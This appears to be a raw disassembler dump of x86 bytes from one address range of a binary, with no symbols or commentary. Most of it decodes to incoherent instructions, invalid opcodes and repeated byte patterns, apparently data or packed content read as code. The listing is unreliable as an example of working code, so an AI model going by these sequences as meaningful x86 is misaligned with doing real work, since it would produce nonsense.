  41f295:	inc    eax
  41f296:	cmc    
  41f297:	aad    0xc7
  41f299:	inc    eax
  41f29a:	cmc    
  41f29b:	jle    0x41f262
  41f29d:	inc    eax
  41f29e:	lds    eax,FWORD PTR [eax]
  41f2a0:	mov    DWORD PTR [eax-0x3b],0xb540c997
  41f2a7:	add    cl,bl
  41f2a9:	inc    eax
  41f2aa:	mov    ch,0xd4
  41f2ac:	int3   
  41f2ad:	inc    eax
  41f2ae:	lds    esi,FWORD PTR [eax-0x33]
  41f2b1:	inc    eax
  41f2b2:	lds    ebx,FWORD PTR [eax-0x724abf2f]
  41f2b8:	rol    DWORD PTR [eax-0x4b],cl
  41f2bb:	push   eax
  41f2bc:	fiadd  DWORD PTR [eax-0x7b]
  41f2bf:	retf   
  41f2c0:	(bad)  
  41f2c1:	inc    eax
  41f2c2:	test   DWORD PTR [edi+0x4e7540dc],edx
  41f2c8:	fld    DWORD PTR [eax+0x75]
  41f2cb:	int3   
  41f2cc:	fadd   DWORD PTR [eax-0x7b]
  41f2cf:	popf   
  41f2d0:	fld    DWORD PTR [eax-0x7b]
  41f2d3:	and    ebx,ebx
  41f2d5:	inc    eax
  41f2d6:	jne    0x41f279
  41f2d8:	fiadd  WORD PTR [eax+0x75]
  41f2db:	and    eax,0x7b4540df
  41f2e0:	loop   0x41f322
  41f2e2:	inc    ebp
  41f2e3:	or     ah,al
  41f2e5:	inc    eax
  41f2e6:	xor    eax,0x1c40dfa0
  41f2eb:	hlt    
  41f2ec:	es in  al,0xdc
  41f2ef:	repz inc edx
  41f2f1:	out    0x0,al
	...
  41f31b:	fdivr  st(3),st
  41f31d:	pop    esp
  41f31e:	out    0xdc,al
  41f320:	repz push cs
  41f322:	in     eax,0xdc
  41f324:	repz jmp 0x5cec:0x39f25ce6
  41f32c:	repnz call 0x5cf2:0xe7f25cee
  41f334:	repnz (bad) 
  41f336:	cmc    
  41f337:	pop    esp
  41f338:	repnz add BYTE PTR [eax],al
  41f33b:	sbb    al,0xf2
  41f33d:	add    BYTE PTR [eax],al
  41f33f:	sbb    al,0xf2
  41f341:	add    BYTE PTR [eax],al
  41f343:	sbb    al,0xf2
  41f345:	add    BYTE PTR [eax],al
  41f347:	sbb    al,0xf2
  41f349:	add    BYTE PTR [eax],al
  41f34b:	sbb    al,0xf2
  41f34d:	mov    edi,0xeb17356b
  41f352:	jae    0x41f350
  41f354:	mov    ecx,0xf24470e1
  41f359:	scas   eax,DWORD PTR es:[edi]
  41f35a:	push   ebx
  41f35b:	pop    ebp
  41f35c:	fidiv  WORD PTR [ebp-0x323506b0]
  41f362:	dec    edi
  41f363:	push   ebx
  41f364:	loopne 0x41f31a
  41f366:	sub    ch,bl
  41f368:	mov    eax,0x23f82300
  41f36d:	out    0x77,al
  41f36f:	add    edx,esi
  41f371:	and    eax,0xca4e30
  41f376:	je     0x41f366
  41f378:	out    0xe5,al
  41f37a:	dec    esi
  41f37c:	jmp    0x425f66
	...
  41f3a5:	add    BYTE PTR [eax],al
  41f3a7:	add    al,bh
  41f3a9:	mov    dh,0xd8
  41f3ab:	(bad)  
  41f3ac:	(bad)  
  41f3ad:	jle    0x41f384
  41f3af:	(bad)  
  41f3b0:	(bad)  
  41f3b2:	loope  0x41f415
  41f3b4:	mov    edi,0xbe2a4b5a
  41f3b9:	jns    0x41f40e
  41f3bb:	add    al,0x1b
  41f3bd:	push   edx
  41f3be:	in     al,0xd
  41f3c0:	daa    
  41f3c1:	push   ecx
  41f3c2:	loopne 0x41f3e7
  41f3c4:	div    BYTE PTR [ecx+0x51]
  41f3c7:	out    dx,eax
  41f3c8:	or     ecx,DWORD PTR [esi-0xf]
  41f3cb:	and    edi,DWORD PTR [eax+0x23244375]
  41f3d1:	ss clc 
  41f3d3:	and    edi,DWORD PTR [esi+ecx*2]
  41f3d6:	icebp  
  41f3d7:	or     al,0x83
  41f3d9:	jne    0x41f3a2
  41f3db:	or     al,0x1b
  41f3dd:	cmp    ecx,DWORD PTR [esp+ebx*8]
  41f3e0:	or     BYTE PTR [eax+0x3b1b2413],0xc7
  41f3e7:	and    edi,DWORD PTR [edi]
  41f3e9:	dec    edx
  41f3ea:	(bad)  
  41f3eb:	and    ebx,DWORD PTR [ebx]
  41f3ed:	cmp    eax,edi
  41f3ef:	loop   0x41f439
  41f3f1:	xchg   esi,edi
  41f3f3:	and    ebx,DWORD PTR [ebx]
  41f3f5:	dec    esi
  41f3f6:	pop    es
  41f3f7:	in     eax,dx
  41f3f8:	xor    eax,0xfc0dec70
  41f3fd:	jbe    0x41f3cb
  41f3ff:	out    0x1b,eax
  41f401:	push   edx
  41f402:	pop    es
  41f403:	and    al,0xff
  41f405:	dec    edx
  41f406:	pop    es
  41f407:	add    al,0xfc
  41f409:	cmp    al,BYTE PTR [edi]
  41f40b:	and    al,0x0
	...
  41f435:	(bad)  
  41f436:	xor    eax,0x3b3c25ba
  41f43b:	pop    es
  41f43c:	add    al,0xd
  41f43e:	jae    0x41f3cc
  41f440:	out    0xf7,eax
  41f442:	inc    edi
  41f443:	fldcw  WORD PTR [ecx]
  41f445:	clc    
  41f446:	outs   dx,BYTE PTR ds:[esi]
  41f447:	add    DWORD PTR [ebx],0x1c
  41f44a:	pop    ebx
  41f44b:	out    0x3,eax
  41f44d:	sbb    al,0x5b
  41f44f:	out    0x3,eax
  41f451:	sbb    al,0x5b
  41f453:	out    0x3,eax
  41f455:	sbb    al,0x5b
  41f457:	add    cl,ch
  41f459:	pop    ds
  41f45a:	pop    ebx
  41f45b:	add    cl,ch
  41f45d:	pop    ds
  41f45e:	pop    ebx
  41f45f:	add    cl,ch
  41f461:	pop    ds
  41f462:	pop    ebx
  41f463:	add    cl,ch
  41f465:	pop    ds
  41f466:	pop    ebx
  41f467:	add    cl,ch
  41f469:	pop    ds
  41f46a:	pop    ebx
  41f46b:	add    cl,ch
  41f46d:	pop    ds
  41f46e:	pop    ebx
  41f46f:	add    cl,ch
  41f471:	pop    ds
  41f472:	pop    ebx
  41f473:	add    cl,ch
  41f475:	pop    ds
  41f476:	pop    ebx
  41f477:	add    cl,ch
  41f479:	pop    ds
  41f47a:	pop    ebx
  41f47b:	add    cl,ch
  41f47d:	pop    ds
  41f47e:	pop    ebx
  41f47f:	add    cl,ch
  41f481:	pop    ds
  41f482:	pop    ebx
  41f483:	add    cl,ch
  41f485:	pop    ds
  41f486:	pop    ebx
  41f487:	add    cl,ch
  41f489:	pop    ds
  41f48a:	pop    ebx
  41f48b:	add    cl,ch
  41f48d:	pop    ds
  41f48e:	pop    ebx
  41f48f:	add    cl,ch
  41f491:	pop    ds
  41f492:	pop    ebx
  41f493:	add    cl,ch
  41f495:	pop    ds
  41f496:	pop    ebx
  41f497:	add    cl,ch
	...
  41f4c1:	add    BYTE PTR [edi],bl
  41f4c3:	pop    ebx
  41f4c4:	add    cl,ch
  41f4c6:	pop    ds
  41f4c7:	pop    ebx
  41f4c8:	add    cl,ch
  41f4ca:	pop    ds
  41f4cb:	pop    ebx
  41f4cc:	add    cl,ch
  41f4ce:	pop    ds
  41f4cf:	pop    ebx
  41f4d0:	add    cl,ch
  41f4d2:	pop    ds
  41f4d3:	pop    ebx
  41f4d4:	add    cl,ch
  41f4d6:	pop    ds
  41f4d7:	pop    ebx
  41f4d8:	add    cl,ch
  41f4da:	pop    ds
  41f4db:	pop    ebx
  41f4dc:	add    cl,ch
  41f4de:	pop    ds
  41f4df:	pop    ebx
  41f4e0:	add    cl,ch
  41f4e2:	pop    ds
  41f4e3:	pop    ebx
  41f4e4:	add    cl,ch
  41f4e6:	pop    ds
  41f4e7:	pop    ebx
  41f4e8:	add    cl,ch
  41f4ea:	pop    ds
  41f4eb:	pop    ebx
  41f4ec:	add    cl,ch
  41f4ee:	pop    ds
  41f4ef:	pop    ebx
  41f4f0:	add    cl,ch
  41f4f2:	pop    ds
  41f4f3:	pop    ebx
  41f4f4:	add    cl,ch
  41f4f6:	pop    ds
  41f4f7:	pop    ebx
  41f4f8:	add    BYTE PTR [eax],al
  41f4fa:	jne    0x41f55a
  41f4fc:	add    BYTE PTR [eax],al
  41f4fe:	jne    0x41f55e
  41f500:	add    BYTE PTR [eax],al
  41f502:	inc    ebp
  41f503:	pop    esi
  41f504:	add    BYTE PTR [eax],al
  41f506:	inc    ebp
  41f507:	pop    esi
  41f508:	add    BYTE PTR [eax],al
  41f50a:	xor    eax,0x3500005e
  41f50f:	pop    esi
  41f510:	add    BYTE PTR [eax],al
  41f512:	inc    ebp
  41f513:	pop    esi
  41f514:	add    BYTE PTR [eax],al
  41f516:	inc    ebp
  41f517:	pop    esi
  41f518:	add    BYTE PTR [eax],al
  41f51a:	xor    eax,0x3500005e
  41f51f:	pop    esi
  41f520:	add    BYTE PTR [eax],al
  41f522:	add    eax,0x5e
	...
  41f54f:	add    eax,0xf500005e
  41f554:	pop    ebp
  41f555:	add    BYTE PTR [eax],al
  41f557:	cmc    
  41f558:	pop    ebp
  41f559:	add    BYTE PTR [eax],al
  41f55b:	add    eax,0x500005e
  41f560:	pop    esi
  41f561:	add    BYTE PTR [eax],al
  41f563:	cmc    
  41f564:	pop    ebp
  41f565:	add    BYTE PTR [eax],al
  41f567:	cmc    
  41f568:	pop    ebp
  41f569:	add    BYTE PTR [eax],al
  41f56b:	lds    ebx,FWORD PTR [ebp+0x0]
  41f56e:	add    ch,al
  41f570:	pop    ebp
  41f571:	add    BYTE PTR [eax],al
  41f573:	mov    ch,0x5d
  41f575:	add    BYTE PTR [eax],al
  41f577:	mov    ch,0x5d
  41f579:	add    BYTE PTR [eax],al
  41f57b:	lds    ebx,FWORD PTR [ebp+0x0]
  41f57e:	add    ch,al
  41f580:	pop    ebp
  41f581:	add    BYTE PTR [eax],al
  41f583:	mov    ch,0x5d
  41f585:	add    BYTE PTR [eax],al
  41f587:	mov    ch,0x5d
  41f589:	add    BYTE PTR [eax],al
  41f58b:	test   DWORD PTR [ebp+0x0],ebx
  41f58e:	add    BYTE PTR [ebp+0x7500005d],al
  41f594:	pop    ebp
  41f595:	add    BYTE PTR [eax],al
  41f597:	jne    0x41f5f6
  41f599:	add    BYTE PTR [eax],al
  41f59b:	sbb    al,0x4
  41f59d:	add    DWORD PTR [eax],eax
  41f59f:	sbb    al,0x4
  41f5a1:	add    DWORD PTR [eax],eax
  41f5a3:	sbb    al,0x4
  41f5a5:	add    DWORD PTR [eax],eax
  41f5a7:	sbb    al,0x4
  41f5a9:	add    DWORD PTR [eax],eax
  41f5ab:	sbb    al,0x4
  41f5ad:	add    DWORD PTR [eax],eax
  41f5af:	sbb    al,0x4
  41f5b1:	add    DWORD PTR [eax],eax
	...
  41f5db:	add    BYTE PTR [esp+eax*1],bl
  41f5de:	add    DWORD PTR [eax],eax
  41f5e0:	sbb    al,0x4
  41f5e2:	add    DWORD PTR [eax],eax
  41f5e4:	sbb    al,0x4
  41f5e6:	add    DWORD PTR [eax],eax
  41f5e8:	sbb    al,0x4
  41f5ea:	add    DWORD PTR [eax],eax
  41f5ec:	sbb    al,0x4
  41f5ee:	add    DWORD PTR [eax],eax
  41f5f0:	sbb    al,0x4
  41f5f2:	add    DWORD PTR [eax],eax
  41f5f4:	sbb    al,0x2
  41f5f6:	add    DWORD PTR [eax],eax
  41f5f8:	sbb    al,0x2
  41f5fa:	add    DWORD PTR [eax],eax
  41f5fc:	sbb    al,0x2
  41f5fe:	add    DWORD PTR [eax],eax
  41f600:	sbb    al,0x2
  41f602:	add    DWORD PTR [eax],eax
  41f604:	sbb    al,0x2
  41f606:	add    DWORD PTR [eax],eax
  41f608:	sbb    al,0x2
  41f60a:	add    DWORD PTR [eax],eax
  41f60c:	sbb    al,0x2
  41f60e:	add    DWORD PTR [eax],eax
  41f610:	sbb    al,0x2
  41f612:	add    DWORD PTR [eax],eax
  41f614:	sbb    al,0x2
  41f616:	add    DWORD PTR [eax],eax
  41f618:	sbb    al,0x2
  41f61a:	add    DWORD PTR [eax],eax
  41f61c:	sbb    al,0x2
  41f61e:	add    DWORD PTR [eax],eax
  41f620:	sbb    al,0x2
  41f622:	add    DWORD PTR [eax],eax
  41f624:	sbb    al,0x2
  41f626:	add    DWORD PTR [eax],eax
  41f628:	sbb    al,0x2
  41f62a:	add    DWORD PTR [eax],eax
  41f62c:	sbb    al,0x2
  41f62e:	add    DWORD PTR [eax],eax
  41f630:	sbb    al,0x2
  41f632:	add    DWORD PTR [eax],eax
  41f634:	sbb    al,0x2
  41f636:	add    DWORD PTR [eax],eax
  41f638:	sbb    al,0x2
  41f63a:	add    DWORD PTR [eax],eax
  41f63c:	sbb    al,0x5b
  41f63e:	out    0x3,eax
	...
  41f668:	add    BYTE PTR [ebx+ebx*2],bl
  41f66b:	out    0x3,eax
  41f66d:	sbb    al,0x5b
  41f66f:	out    0x3,eax
  41f671:	sbb    al,0x5b
  41f673:	call   0x70c1d59c
  41f678:	lods   al,BYTE PTR ds:[esi]
  41f679:	push   edi
  41f67a:	or     ch,bh
  41f67c:	ss xchg esi,eax
  41f67e:	sar    DWORD PTR [edi+ebp*4+0xd],cl
  41f682:	dec    ebx
  41f683:	pusha  
  41f684:	lods   al,BYTE PTR ds:[esi]
  41f685:	push   edi
  41f686:	or     al,ch
  41f688:	and    bl,bh
  41f68a:	jg     0x41f6f3
  41f68c:	add    al,0xdc
  41f68e:	pop    edx
  41f68f:	pop    es
  41f690:	add    al,0xc
  41f692:	pop    ebx
  41f693:	fild   WORD PTR [ebx]
  41f695:	and    BYTE PTR [ebx-0x17],bl
  41f698:	add    esp,DWORD PTR [ebx]
  41f69a:	clc    
  41f69b:	out    0x3,al
  41f69d:	pushf  
  41f69e:	pop    edx
  41f69f:	out    0x3,eax
  41f6a1:	pop    esp
  41f6a2:	pop    ebx
  41f6a3:	out    0x3,eax
  41f6a5:	cmp    al,0x5b
  41f6a7:	out    0x3,eax
  41f6a9:	sub    al,0x5b
  41f6ab:	out    0x3,eax
  41f6ad:	and    al,0x5b
  41f6af:	out    0x3,eax
  41f6b1:	sbb    BYTE PTR [ebx-0x19],bl
  41f6b4:	add    ebx,DWORD PTR [esi]
  41f6b6:	pop    ebx
  41f6b7:	out    0x3,eax
  41f6b9:	jecxz  0x41f6b2
  41f6bb:	out    0x83,al
  41f6bd:	sbb    al,0x5b
  41f6bf:	out    0xc3,eax
  41f6c1:	shl    edi,cl
  41f6c3:	out    0x23,al
  41f6c5:	sbb    al,0x5b
  41f6c7:	out    0xf3,eax
  41f6c9:	ret    
  41f6ca:	mul    esi
  41f6cc:	or     eax,DWORD PTR [eax]
	...
  41f6f6:	sbb    al,0x5b
  41f6f8:	out    0xff,eax
  41f6fa:	mov    bl,0xf7
  41f6fc:	out    0x1,al
  41f6fe:	sbb    al,0x5b
  41f700:	out    0x4,eax
  41f702:	sbb    al,0x5b
  41f704:	addr16 add al,0x1c
  41f707:	pop    ebx
  41f708:	add    BYTE PTR [ecx+0x9005b1f],ch
  41f70e:	and    BYTE PTR [ebx+0x0],bl
  41f711:	stc    
  41f712:	pop    ds
  41f713:	pop    ebx
  41f714:	add    cl,dh
  41f716:	pop    ds
  41f717:	pop    ebx
  41f718:	add    ch,ch
  41f71a:	pop    ds
  41f71b:	pop    ebx
  41f71c:	add    bl,ch
  41f71e:	pop    ds
  41f71f:	pop    ebx
  41f720:	add    al,ch
  41f722:	pop    ds
  41f723:	pop    ebx
  41f724:	add    cl,al
  41f726:	das    
  41f727:	inc    ebx
  41f728:	and    cl,dl
  41f72a:	dec    edi
  41f72b:	pop    edi
  41f72c:	add    BYTE PTR [eax+0x1f4030],dh
  41f732:	dec    ecx
  41f733:	pusha  
  41f734:	jmp    DWORD PTR [edx]
  41f736:	push   cs
  41f737:	inc    ebp
  41f738:	and    dh,bl
  41f73a:	sub    eax,0xf120261
  41f73f:	inc    edx
  41f740:	and    DWORD PTR [edi],eax
  41f742:	adc    cl,BYTE PTR [ecx+0x26]
  41f745:	fisttp WORD PTR [ecx]
  41f747:	imul   eax,DWORD PTR [esi],0x23422cf4
  41f74d:	int3   
  41f74e:	or     al,0x62
  41f750:	add    esp,ebp
  41f752:	adc    eax,DWORD PTR [edi+0x24]
  41f755:	std    
  41f756:	or     esp,DWORD PTR [ebx+0x4]
  41f759:	repnz add BYTE PTR [eax],al
	...
  41f780:	add    BYTE PTR [eax],al
  41f782:	add    dh,ch
  41f784:	arpl   WORD PTR [ecx],ax
  41f786:	call   0xf14856a8
  41f78b:	adc    eax,0xd0ee0e67
  41f790:	dec    ebx
  41f791:	adc    ebx,esi
  41f793:	rcl    BYTE PTR [ebx+0x1c],1
  41f796:	fmul   st(7),st
  41f798:	fs adc eax,0x195cc3e9
  41f79e:	out    dx,eax
  41f79f:	sbb    al,0x4f
  41f7a1:	pop    es
  41f7a2:	jmp    FWORD PTR [ebp-0x550ffe9d]
  41f7a8:	addr16 push es
  41f7aa:	add    BYTE PTR [edi+0x2d0108e9],bh
  41f7b0:	dec    edx
  41f7b1:	push   ds
  41f7b2:	and    al,0x1b
  41f7b4:	sbb    DWORD PTR gs:[edi],esp
  41f7b7:	xchg   DWORD PTR [esi],edi
  41f7b9:	and    BYTE PTR [edi],ch
  41f7bb:	outs   dx,BYTE PTR ds:[esi]
  41f7bc:	dec    edx
  41f7bd:	es aaa 
  41f7bf:	sub    WORD PTR fs:[ecx],bp
  41f7c3:	push   esp
  41f7c4:	cmp    DWORD PTR [edi+ebx*1],ebx
  41f7c7:	jne    0x41f7bf
  41f7c9:	std    
  41f7ca:	add    BYTE PTR [ebp+0x5a],dh
  41f7cd:	add    BYTE PTR [eax],al
  41f7cf:	inc    ebp
  41f7d0:	pop    edx
  41f7d1:	std    
  41f7d2:	inc    DWORD PTR [ecx-0xa]
  41f7d5:	std    
  41f7d6:	add    BYTE PTR [ecx+0x5a],al
  41f7d9:	std    
  41f7da:	add    BYTE PTR [ecx],dh
  41f7dc:	idiv   ch
  41f7de:	inc    DWORD PTR [ecx+0x5a]
  41f7e1:	add    BYTE PTR [eax],al
  41f7e3:	inc    ebp
  41f7e4:	pop    edx
  41f7e5:	std    
  41f7e6:	inc    DWORD PTR [eax]
	...
  41f810:	xor    eax,0x35fffcf6
  41f815:	idiv   ch
  41f817:	add    BYTE PTR [ecx],al
  41f819:	idiv   ch
  41f81b:	add    BYTE PTR ds:0x1fffcf6,al
  41f821:	idiv   ah
  41f823:	add    cl,dh
  41f825:	pop    ecx
  41f826:	std    
  41f827:	add    BYTE PTR ds:0x101005a,al
  41f82d:	pop    edx
  41f82e:	add    BYTE PTR [eax],al
  41f830:	add    esi,esi
  41f832:	cld    
  41f833:	push   ebp
  41f835:	cmc    
  41f836:	cld    
  41f837:	add    ch,al
  41f839:	cmc    
  41f83a:	cld    
  41f83b:	add    ch,al
  41f83d:	cmc    
  41f83e:	std    
  41f83f:	push   DWORD PTR [ebp-0x4a00020b]
  41f845:	pop    ecx
  41f846:	std    
  41f847:	add    ch,al
  41f849:	pop    ecx
  41f84a:	std    
  41f84b:	add    BYTE PTR [eax+ecx*1],bl
  41f84e:	std    
  41f84f:	call   FWORD PTR [eax+eax*1]
  41f852:	add    edi,edi
  41f854:	mov    ds:0x1d000107,eax
  41f859:	add    BYTE PTR [ecx],al
  41f85b:	add    BYTE PTR ds:0x8bff0108,bl
  41f861:	add    eax,DWORD PTR [ecx]
  41f863:	add    BYTE PTR [eax+ecx*1],bl
  41f866:	std    
  41f867:	(bad)  
  41f868:	jnp    0x41f869
  41f86a:	cld    
  41f86b:	(bad)  
  41f86c:	jae    0x41f871
  41f86e:	add    DWORD PTR [eax],eax
  41f870:	sbb    eax,0xff0104
	...
  41f89d:	arpl   WORD PTR [edi],ax
  41f89f:	std    
  41f8a0:	(bad)  
  41f8a1:	sbb    al,0x0
  41f8a3:	add    DWORD PTR [eax],eax
  41f8a5:	sbb    al,0x4
  41f8a7:	add    edi,edi
  41f8a9:	sbb    al,0x4
  41f8ab:	std    
  41f8ac:	(bad)  
  41f8ad:	sbb    al,0x4
  41f8af:	add    DWORD PTR [eax],eax
  41f8b1:	sbb    eax,0x1d000104
  41f8b6:	add    al,0xfd
  41f8b8:	jmp    FWORD PTR [ebx]
  41f8ba:	inc    DWORD PTR [eax]
  41f8bc:	call   FWORD PTR [esp+eax*1]
  41f8bf:	add    edi,edi
  41f8c1:	sbb    eax,DWORD PTR [ebx]
  41f8c3:	std    
  41f8c4:	(bad)  
  41f8c5:	adc    eax,DWORD PTR [edi]
  41f8c7:	add    DWORD PTR [eax],eax
  41f8c9:	sbb    eax,0x3fffd02
  41f8ce:	pop    es
  41f8cf:	add    DWORD PTR [eax],eax
  41f8d1:	sbb    al,0xfe
  41f8d3:	cld    
  41f8d4:	call   FWORD PTR [esi+eax*1]
  41f8d7:	std    
  41f8d8:	(bad)  
  41f8d9:	jmp    0x41f8d9
  41f8db:	cld    
  41f8dc:	(bad)  
  41f8dd:	sbb    al,0x6
  41f8df:	add    edi,edi
  41f8e1:	fild   DWORD PTR [edx]
  41f8e3:	add    edi,edi
  41f8e5:	sbb    al,0x6
  41f8e7:	std    
  41f8e8:	call   FWORD PTR [esi+edi*8]
  41f8eb:	add    BYTE PTR [eax],al
  41f8ed:	sbb    eax,0xbbffeb5b
  41f8f2:	hlt    
  41f8f3:	loop   0x41f8f4
  41f8f5:	mov    dl,0xf4
  41f8f7:	out    0xff,al
  41f8f9:	stos   BYTE PTR es:[edi],al
  41f8fa:	pop    ebx
  41f8fb:	jecxz  0x41f8fc
  41f8fd:	mov    ds:0xffe6f4,eax
	...
  41f92a:	fwait
  41f92b:	pop    ebx
  41f92c:	out    0xff,eax
  41f92e:	xchg   ebx,eax
  41f92f:	pop    ebx
  41f930:	out    0x3,eax
  41f932:	sbb    al,0x5b
  41f934:	jecxz  0x41f939
  41f936:	xor    esp,0xffffffe6
  41f939:	(bad)  
  41f93a:	jp     0x41f930
  41f93c:	out    0x3,al
  41f93e:	sbb    al,0x5b
  41f940:	jmp    0x41f945
  41f942:	imul   ebx,DWORD PTR [ebx-0x39],0xffffff83
  41f946:	or     al,0xdb
  41f948:	out    0x83,al
  41f94a:	sbb    al,0xdb
  41f94c:	out    0x83,al
  41f94e:	sbb    al,0x5b
  41f950:	mov    DWORD PTR [ebx+0x3e75b2c],0x4075b2c
  41f95a:	sbb    al,0x5b
  41f95c:	pop    es
  41f95d:	add    al,0xc
  41f95f:	fild   DWORD PTR [esi]
  41f961:	test   BYTE PTR [ebx+ebx*8],bl
  41f964:	push   es
  41f965:	add    al,0x1c
  41f967:	fild   DWORD PTR [esi]
  41f969:	test   BYTE PTR [ebx+ebx*8],ch
  41f96c:	out    0x83,al
  41f96e:	sub    al,0xdb
  41f970:	out    0x3,al
  41f972:	sbb    al,0xdb
  41f974:	out    0x83,al
  41f976:	sbb    al,0xdb
  41f978:	out    0x3,al
  41f97a:	or     al,0x5b
  41f97c:	mov    DWORD PTR [ebx],0x3c75b1c
  41f982:	or     al,0xdb
  41f984:	out    0x83,al
  41f986:	or     al,0x5b
  41f988:	mov    DWORD PTR [ebx],0x83c75b2c
	...
  41f9b6:	add    BYTE PTR [ebx+ebx*8],bl
  41f9b9:	(bad)  
  41f9ba:	call   0xe94254de
  41f9bf:	pop    ds
  41f9c0:	pop    ebx
  41f9c1:	sub    cl,0x9f
  41f9c4:	pop    edx
  41f9c5:	add    BYTE PTR [ecx],cl
  41f9c7:	cwde   
  41f9c8:	dec    edx
  41f9c9:	add    cl,ch
  41f9cb:	pop    ds
  41f9cc:	dec    ebx
  41f9cd:	or     BYTE PTR [ecx],0x18
  41f9d0:	dec    ebx
  41f9d1:	add    BYTE PTR [ecx],cl
  41f9d3:	and    BYTE PTR [ebx-0x80],bl
  41f9d6:	jmp    0xe94254fa
  41f9db:	lahf   
  41f9dc:	dec    edx
  41f9dd:	add    BYTE PTR [ecx],cl
  41f9df:	cwde   
  41f9e0:	pop    edx
  41f9e1:	add    cl,ch
  41f9e3:	lahf   
  41f9e4:	dec    edx
  41f9e5:	sub    cl,0x1f
  41f9e8:	dec    ebx
  41f9e9:	or     cl,0x9f
  41f9ec:	pop    edx
  41f9ed:	add    cl,ch
  41f9ef:	pop    ds
  41f9f0:	pop    ebx
  41f9f1:	add    cl,cl
  41f9f3:	lahf   
  41f9f4:	dec    edx
  41f9f5:	add    cl,cl
  41f9f7:	pop    ds
  41f9f8:	dec    ebx
  41f9f9:	sub    cl,0x1f
  41f9fc:	dec    ebx
  41f9fd:	add    cl,cl
  41f9ff:	lahf   
  41fa00:	pop    edx
  41fa01:	sub    cl,0x1f
  41fa04:	dec    ebx
  41fa05:	sub    cl,0x9f
  41fa08:	dec    edx
  41fa09:	sub    cl,0x9f
  41fa0c:	pop    edx
  41fa0d:	add    cl,ch
  41fa0f:	pop    ds
  41fa10:	dec    ebx
  41fa11:	sub    cl,0x9f
  41fa14:	pop    ebx
  41fa15:	or     BYTE PTR [ecx],0x18
  41fa18:	pop    ebx
  41fa19:	add    BYTE PTR [ecx],cl
	...
  41fa43:	add    BYTE PTR [eax-0x67f67fb5],ah
  41fa49:	dec    ebx
  41fa4a:	add    cl,cl
  41fa4c:	pop    ds
  41fa4d:	pop    ebx
  41fa4e:	add    cl,ch
  41fa50:	lahf   
  41fa51:	pop    ebx
  41fa52:	add    cl,ch
  41fa54:	pop    ds
  41fa55:	pop    ebx
  41fa56:	or     cl,0x9f
  41fa59:	pop    ebx
  41fa5a:	add    BYTE PTR [eax],al
  41fa5c:	(bad)
  41fa5f:	add    ch,0x5e
  41fa62:	adc    BYTE PTR [eax],al
  41fa64:	aad    0x5e
  41fa66:	add    BYTE PTR [eax+0x105ed5],al
  41fa6c:	and    eax,0x257fffd7
  41fa71:	push   edi
  41fa72:	add    BYTE PTR [eax+0x105715],al
  41fa78:	mov    ch,0xde
  41fa7a:	sldt   WORD PTR [ebp-0x7affffa2]
  41fa81:	fdivp  st(7),st
  41fa83:	jg     0x41fa9a
  41fa85:	xlat   BYTE PTR ds:[ebx]
  41fa86:	(bad)  
  41fa87:	push   DWORD PTR [ebp+0x5e]
  41fa8a:	add    BYTE PTR [eax-0x7fefa19b],al
  41fa90:	fimul  WORD PTR gs:[edi]
  41fa93:	xor    BYTE PTR [ebp-0x22],0xf
  41fa97:	add    BYTE PTR [ebp+0x58],bh
  41fa9a:	add    BYTE PTR [eax],al
  41fa9c:	inc    ebp
  41fa9d:	pop    eax
  41fa9e:	add    cl,BYTE PTR [eax]
  41faa0:	inc    ebp
  41faa1:	pop    esi
  41faa2:	add    BYTE PTR [eax],al
  41faa4:	cmp    eax,0x8025e
	...
  41fad1:	xor    eax,0x45080058
  41fad6:	pop    esi
  41fad7:	add    BYTE PTR [eax],al
  41fad9:	sub    eax,0x35000258
  41fade:	pop    eax
  41fadf:	add    BYTE PTR [eax],cl
  41fae1:	cmp    eax,0xd00025e
  41fae6:	pop    esi
  41fae7:	add    BYTE PTR [eax],cl
  41fae9:	or     eax,0xf508005e
  41faee:	pop    ebp
  41faef:	add    al,BYTE PTR [eax]
  41faf1:	std    
  41faf2:	push   edi
  41faf3:	add    cl,BYTE PTR [eax]
  41faf5:	in     eax,dx
  41faf6:	pop    ebp
  41faf7:	add    al,BYTE PTR [eax]
  41faf9:	add    eax,0x1c08025e
  41fafe:	cld    
  41faff:	add    al,BYTE PTR [eax]
  41fb01:	sbb    al,0x4
  41fb03:	add    DWORD PTR [eax],eax
  41fb05:	and    al,0xec
  41fb07:	add    BYTE PTR [eax],al
  41fb09:	sbb    al,0x4
  41fb0b:	add    eax,DWORD PTR [edx]
  41fb0d:	adc    al,0x4
  41fb0f:	add    eax,DWORD PTR [eax]
  41fb11:	sbb    al,0x4
  41fb13:	add    eax,DWORD PTR [edx]
  41fb15:	sbb    al,0x4
  41fb17:	add    DWORD PTR [edx],eax
  41fb19:	and    al,0xec
  41fb1b:	add    BYTE PTR [edx],al
  41fb1d:	adc    al,0xfc
  41fb1f:	add    al,BYTE PTR [edx]
  41fb21:	sbb    al,0xfc
  41fb23:	add    al,BYTE PTR [eax]
  41fb25:	and    al,0x4
  41fb27:	add    eax,DWORD PTR [edx]
  41fb29:	sbb    al,0x4
  41fb2b:	add    DWORD PTR [edx],eax
  41fb2d:	sbb    al,0xfc
  41fb2f:	add    al,BYTE PTR [eax]
  41fb31:	adc    al,0xfc
	...
  41fb5b:	add    BYTE PTR [eax],al
  41fb5d:	add    BYTE PTR [esp+ebp*8],bl
  41fb60:	add    al,BYTE PTR [edx]
  41fb62:	and    al,0x4
  41fb64:	add    eax,DWORD PTR [eax]
  41fb66:	sbb    al,0x4
  41fb68:	add    DWORD PTR [eax],eax
  41fb6a:	adc    al,0x4
  41fb6c:	add    eax,DWORD PTR [edx]
  41fb6e:	and    al,0x4
  41fb70:	add    DWORD PTR [eax],eax
  41fb72:	and    al,0xec
  41fb74:	add    BYTE PTR [edx],al
  41fb76:	sbb    al,0xfc
  41fb78:	add    al,BYTE PTR [eax]
  41fb7a:	sbb    al,0x4
  41fb7c:	add    DWORD PTR [edx],eax
  41fb7e:	sbb    al,0x4
  41fb80:	add    eax,DWORD PTR [edx]
  41fb82:	and    al,0x4
  41fb84:	add    eax,DWORD PTR [eax]
  41fb86:	adc    al,0x4
  41fb88:	add    DWORD PTR [eax],eax
  41fb8a:	sbb    al,0x4
  41fb8c:	add    eax,DWORD PTR [eax]
  41fb8e:	sbb    al,0xea
  41fb90:	add    BYTE PTR [edx],al
  41fb92:	sbb    al,0xea
  41fb94:	add    al,BYTE PTR [edx]
  41fb96:	adc    al,0x2
  41fb98:	add    eax,DWORD PTR [eax]
  41fb9a:	adc    al,0xfa
  41fb9c:	add    BYTE PTR [eax],al
  41fb9e:	and    al,0x5b
  41fba0:	out    0x5,eax
